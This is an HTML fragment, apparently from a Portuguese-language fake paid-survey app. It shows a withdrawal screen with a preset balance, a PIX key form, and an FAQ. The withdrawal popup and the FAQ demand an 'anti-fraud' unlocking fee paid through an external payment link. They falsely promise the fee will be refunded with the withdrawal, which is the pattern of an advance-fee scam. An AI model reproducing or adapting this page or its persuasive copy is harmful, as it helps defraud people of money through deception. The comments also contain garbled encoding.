      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
      <a href="#" onclick="mostrarPagina('saque')">
        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">paid</span>
      </a>
       
      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" -->
      <a href="#" onclick="mostrarPagina('inicio')">
        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">home</span>
      </a>
      
      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" -->
      <a href="#" onclick="mostrarPagina('bonus')">
        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">help</span>
      </a>
    </div>
  </div>


  
  <!--------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "Saque" --------------------->

  
  <div id="saque" style="display: none;">

    <div class="menu">
      <a>
        <img src="images/opinilogo.png">
      </a> 
      <a></a>
    </div>


    <div style="margin-bottom: 100px;"></div>
      
    
    <div class="outer-box">
      <div class="valor-box-saque">
          <p style="font-size: 16px; margin-bottom: 15px; text-align: center; color: rgb(101, 101, 101);">Seu saldo</p>
          <span id="valor-money" style="font-size: 45px; text-align: center; font-family: 'Montserrat', sans-serif; letter-spacing: -2px; color: #06B32E;">R$ 67.00</span>
      </div>
    </div>

    <p style="margin-bottom: 18px; margin-top: 23px; color: rgb(101, 101, 101); text-align: center; font-weight: bold;">Selecione seu tipo de chave PIX</p>

    
    <div class="button-container">
      
      <button class="square-button" onclick="toggleButton(1)">
        <img decoding="async" src="images/cpf.png" alt="Botao 1">
      </button>
      
      <button class="square-button" onclick="toggleButton(2)">
        <img decoding="async" src="images/telefone.png" alt="Botao 2">
      </button>
      
      <button class="square-button" onclick="toggleButton(3)">
        <img decoding="async" src="images/email.png" alt="Botao 3">
      </button>
      
      <button class="square-button" onclick="toggleButton(4)">
        <img decoding="async" src="images/qr.png" alt="Botao 4">
      </button>

    </div>

    <div style="margin-bottom: 15px;"></div>
    
    

    
    <!--------------------- MENU EMBAIXO --------------------->

    
    <div class="menuemb">
      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
      <a href="#" onclick="mostrarPagina('saque')">
        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">paid</span>
      </a>
       
      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" -->
      <a href="#" onclick="mostrarPagina('inicio')">
        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">home</span>
      </a>
      
      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" -->
      <a href="#" onclick="mostrarPagina('bonus')">
        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">help</span>
      </a>
    </div>

    


    <input class="form-input" type="text" name="chave-pix" id="chave-pix" placeholder="Digite sua chave PIX aqui">

    <input class="form-input" style="margin-top: 15px;" type="text" name="quantia" id="quantia" placeholder="Digite o valor que deseja sacar" inputmode="numeric" oninput="formatarValor(this)">
    
    <button class="desbloquear-button" onclick="showPopup()" style="font-weight: bold; font-size: 18x; border-radius: 12px; margin-top: 15px;">REALIZAR SAQUE</button>
  
  <!--------------------- TAXA DESBLOQUEIO --------------------->
    

  
    <div class="popup-container" id="popup">
        
      <script src="js/lottie-player.js"></script><lottie-player src="https://lottie.host/7c73a00c-afa8-4ad5-b6b7-d8050e57f0c3/pg6N0GhPE7.json" background="##ffffff" speed="1.25" style="width: 150px; height: 150px; margin: 0 auto; display: flex;" loop="" autoplay="" direction="1" mode="normal"></lottie-player>

      <!--<span class="popup-text" style="font-size: 20px; font-weight: bold;">APRENDA A DESBLOQUEAR<br>SEU SALDO EM 1 MINUTO</span>--->
      <span class="popup-text" style="font-size: 20px; font-weight: bold;">DESBLOQUEAR SEU SALDO</span>

      <div style="margin-bottom: 20px;"></div>
      <p class="popup-text" style="padding-left: 5%; padding-right: 5%; text-align: justify;">Usamos uma taxa anti-fraudes, para evitar fraudes e abuso dos saques que estavam ocorrendo dentro do sistema.<br><br>Fique tranquilo, voce recebera o valor da taxa de volta junto ao valor do seu saque, e apenas uma etapa de validamento de que voce seria um humano e nao um robo.</p>
      <div style="margin-bottom: 20px;"></div>

      <button class="desbloquear-button" style="font-weight: bold;" onclick="window.open('https://pay.risepay.com.br/Pay/45e7e907cc0742b6bf93f69f31275cdc', '_blank')">DESBLOQUEAR AGORA</button>
      <!--<button class="desbloquear-button" style="font-weight: bold;" onclick="video();">VEJA COMO</button>--->
    </div>

    <div style="margin-bottom: 20px;"></div>

    <!--------------------- VIDEO DESBLOQUEIO --------------------->

    <!--<div class="popup-container" id="popupvideo">
      
      <div style="width: 70%; height: 70%; display: flex; margin: 0 auto; border-radius: 12px; margin-bottom: 10px;">

        <div id="vid_66e1c3401885e4000b3aad6c" style="position:relative;width:100%;padding: 177.77777777777777% 0 0;"> <img id="thumb_66e1c3401885e4000b3aad6c" src="https://images.converteai.net/4021afbb-79eb-4170-8b80-b0a82d04c077/players/66e1c3401885e4000b3aad6c/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"> <div id="backdrop_66e1c3401885e4000b3aad6c" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div> </div> <script type="text/javascript" id="scr_66e1c3401885e4000b3aad6c"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/4021afbb-79eb-4170-8b80-b0a82d04c077/players/66e1c3401885e4000b3aad6c/player.js", s.async=!0,document.head.appendChild(s); </script> <style> .elementor-element:has(#smartplayer) { width: 100%; } </style>

      </div>

      <button class="desbloquear-button" style="font-weight: bold;" onclick="window.open('https://pay.risepay.com.br/Pay/45e7e907cc0742b6bf93f69f31275cdc', '_blank')">DESBLOQUEAR AGORA</button>

    </div>

    <div style="margin-bottom: 20px;"></div>--->

    
  </div>
  

 
    <!--------------------- Pagina bonus --------------------->
	
	

  <div id="bonus" style="display: none;">
      
      
      <!--------------------- Menu de cima --------------------->
      
        <div class="menu">
          <a>
            <img src="images/opinilogo.png">
          </a> 
          <a></a>
        </div>
        <div style="margin-bottom: 90px;"></div>
    
        <div style="margin-bottom: 110px;"></div>
     
        <p class="faq-title">Perguntas frequentes</p>

        <div class="faq-container">
          <div class="faq-item">
            <div class="question" onclick="toggleAnswer(this)">Preciso pagar a taxa toda vez?</div>
            <div class="answer">Nao! A taxa eseria paga somente a primeira vez, para confirmar que voce seria um humano, e nao um robo. Voce recebera o estorno do valor da taxa, apos o primeiro saque!</div>
          </div>
          <div class="faq-item">
            <div class="question" onclick="toggleAnswer(this)">Por que existe a taxa?</div>
            <div class="answer"> Serve como uma etapa anti-fraude, para evitar fraudes e abuso dos saques que estavam ocorrendo dentro da plataforma! Mas nao precisa se preocupar, voce recebera o valor da taxa de volta, junto ao valor do seu saque, seria apenas uma etapa de validamento de que voce e humano e nao um robo.</div>
          </div>
          <div class="faq-item">
            <div class="question" onclick="toggleAnswer(this)">Em quanto tempo vou receber?</div>
            <div class="answer">Voce recebera seu saque dentro de 24 horas, da mesma forma que voce receber seu saque teste!</div>
          </div>
          <div class="faq-item">
            <div class="question" onclick="toggleAnswer(this)">Quantas vezes posso sacar por dia?</div>
            <div class="answer">Quantas voce quiser, mas existe uma quantidade limitada de codigos que temos acesso por dia!</div>
          </div>
          <div class="faq-item">
            <div class="question" onclick="toggleAnswer(this)">Como usa o aplicativo?</div>
            <div class="answer">e muito simples de usar! Basta responder as simples perguntas sobre as empresas, no menu principal, e por fim, clicar no botao de "Enviar respostas", quando enviar, ja recebera seu dinheiro pela tarefa realizada!</div>
          </div>
      </div>

      <div style="margin-bottom: 150px;"></div>



  
    
    
    <!--------------------- Menu debaixo --------------------->

    
    

 
    
    <div class="menuemb">
      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
      <a href="#" onclick="mostrarPagina('saque')">
        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">paid</span>
      </a>
       
      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" -->
      <a href="#" onclick="mostrarPagina('inicio')">
        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">home</span>
      </a>
      
      <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" -->
      <a href="#" onclick="mostrarPagina('bonus')">
        <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">help</span>
      </a>
    </div>
    
    
  </div>
  
  <!--------------------- Fim do body --------------------->
  
  <script src="js/scripts.js"></script>


</body></html>
